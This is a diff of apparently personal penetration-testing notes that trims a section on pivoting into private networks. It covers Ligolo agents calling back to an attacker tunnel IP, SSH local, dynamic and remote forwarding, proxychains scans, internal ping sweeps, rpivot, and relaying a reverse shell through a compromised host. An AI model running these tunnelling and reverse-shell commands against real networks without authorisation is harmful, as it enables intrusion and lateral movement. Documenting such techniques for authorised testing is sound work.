@@ -1,3 +1,10 @@
+---
+title: Authentication
+tags: [Import-63f4]
+created: '2024-09-28T15:47:47.936Z'
+modified: '2025-01-08T10:26:41.719Z'
+---
+
 # Authentication
 
 ## General process
@@ -1899,227 +1906,50 @@ Once inside redis environment `info` return information about the  server
 
 A way to access services that cannot be accessed by the outside
 
-Kali -> Pivot Host -> Intranet Host (private)
-
-The <PivotIntranetIP> is the private IP of the Pivot Host that can communicate with the Intranet Host, that is the two IPs share the first blocks, while the <IP> is the public one, that you can already connect to.
+- Ligolo: meno stealth di SSH ma piu comodo, doeesn't work on 32 bit
+- SSH: more stealth than Ligolo
+- chisel: Less stealth than ssh, but works on 32 bit
 
 #### Local forwarding
 
-Send a local service to your machine. 
+Send a local service to your machine.
 
-- **Ligolo**
+```bash
+ssh -L [ATTACKER_PORT]:[INTRANET_IP]:[TARGET_PORT] [USER]@[IP] -fN
+```
 
-  1. On your machine, run `ligstart` to start the ligolo server
+- `INTRANET_IP` is a private IP, usually 127.0.0.1
+- `-fN` to background the ssh terminal
+- `-L` can be specified multiple times
 
-  2. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
+#### Remote forwarding
 
-  3. On the target:
-
-     ```bash
-     ./agent -connect [TUNIP]:[LigoloPort] -ignore-cert
-     ```
-
-  4. On the ligolo server:
-
-     ```
-     session
-     # Select the session
-     start 
-     ```
-
-  5. On you PC, add the route
-
-     ```bash
-     sudo ip route add 240.0.0.1 dev ligolo
-     ```
-
-  6. Access any local port on `240.0.0.1:[PORT]`
-
-- **SSH**
-
-  ```bash
-  ssh -L [ATTACKER_PORT]:[INTRANET_IP]:[TARGET_PORT] [USER]@[IP] -fN
-  ```
-
-  - `INTRANET_IP` is a private IP, usually 127.0.0.1
-
-  - `-fN` to background the ssh terminal
-
-  - `-L` can be specified multiple times
+You open a server on your computer and send it to the target.
 
 #### Dynamic forwarding
 
-Access private subnetworks of the target. Forwards all the service of the private subnetworks to you.
+Access private subnetworks of the target.
 
-On the target machine, run `ifconfig` to see if there is a private network open. Then check the CIDR of the private networks:
+On the target machine, run `ifconfig` to see if there is a private network open.
 
-- Linux -> `ip route`
-- Windows -> `route -n`
+- **Ligolo**
 
-Tools:
-
-- **Ligolo**: Win/Lin only 64bit
-
-  1. To get the `CIDR` , note the corresponding intranet IP with `ip route`
-
+  1. To get the `CIDR` , note the corresponding IP of the interface with `ip route`
   2. On your machine, run `ligstart` to start the ligolo server
-
+  
   3. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
 
   4. On the target:
 
      ```bash
-     ./agent -connect [TUNIP]:[LigoloPort] -ignore-cert
-     ```
-
-  5. On the ligolo server:
-
-    ```
-    session
-    # Select the session
-    start 
-    ```
-
-  6. On you PC, add the route
-
-    ```bash
-    sudo ip route add [CIDR] dev ligolo
-    ```
-
-- **SSH**
-
-  1. Enable dynamic forwarding
-
-     ```bash
-     ssh -D 9050 [USER]@[IP] [-i KEY]
-     ```
-
-  2. Add the port of `proxychains` in `/etc/proxychains4.conf`
-
-     ```bash
-     [PROXY] 127.0.0.1 9050	
-     ```
-
-  3. To discover internal hosts, do a local ping sweep on the pivot target:
-
-     - Linux:
-
-     ```bash
-     for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
-     ```
-
-     - Windows:
-
-     ```cmd
-     %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
-     ```
-
-  4. Run `nmap` (we can only perform a TCP connect scan over proxychains) 
-
-     ```bash
-     sudo proxychains nmap -v -Pn -sT [IP]
-     ```
-
-  5. Interact through `proxychains` with other services eg:
-
-     `sudo proxychains firefox-esr`
-
-     `sudo proxychains ftp [INTERNAL_FTP_IP]`
-
-  6. Alternatively, enter in a proxychained ZSH so you don't have to type everytime
-
-     `proxychains zsh`
-
-  7. To discover alive hosts in the internal network, do a local ping sweep on the pivot host
-
-- **Rpivot** (SOCKS tunneling)
-
-  1. On Kali, run server.py
-
-     ```bash
-     python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
-     ```
-
-  2. Transfer `rpivot` to the target `scp -r rpivot`
-
-  3. Run client.py on the Pivot
-
-     ```bash
-     python2.7 client.py --server-ip <tunip> --server-port 9999
-     ```
-
-  4. Use proxychains
-  
-- **Metasploit**
-
-- **plink.exe**
-
-- **sshuttle**
-
-- **chisel**: Win/Lin also 32bit
-
-- **netsh**
-
-- **socat**
-
-#### Remote/reverse forwarding
-
-Forward a local service to a remote port. Usually used to gain shells or exchange files from the pivoted hosts to other targets that are only reachable from the pivot hosts via dynamic forwarding.
-
-- **Ligolo**
-
-  1. On your machine, run `ligstart` to start the ligolo server
-
-  2. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
-
-  3. On the target:
-
-     ```bash
      ./agent -connect [TUNIP]:[LI] -ignore-cert
      ```
+  
+     
 
-  4. On the ligolo server:
 
-     ```
-     session
-     # Select the session
-     start 
-     ```
 
-  5. On the legolo server, add the listener
 
-     ```bash
-     listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:8000 --tcp 
-     ```
-
-  6. Open listener
-
-     ```bash
-     listen 8000 	# netcat
-     httpserv 8000	# hhtp 
-     ```
-
-  7. Request payload on `<PivotIntranetIP>:30000`
-
-- **SSH** (e.g. for a rev shell)
-
-  1. Generate a payload with <PayloadPort> and <IntranetIP>
-
-  2. Transfer the payload from Kali -> comprised host -> private host
-
-  3. On Kali, open a listener on <ListenPort>
-
-  4. Connect to the Pivot and forward the connection from the pivot to you 
-
-     ```bash
-     ssh -R <PivotIntranetIP>:<PayloadPort>:0.0.0.0:<ListenPort> <User>@<IP> -vN
-     ```
-
-- **chisel**
-
-- **Metasploit**
-
-- **Socat**
 
 ## Active Directory
 
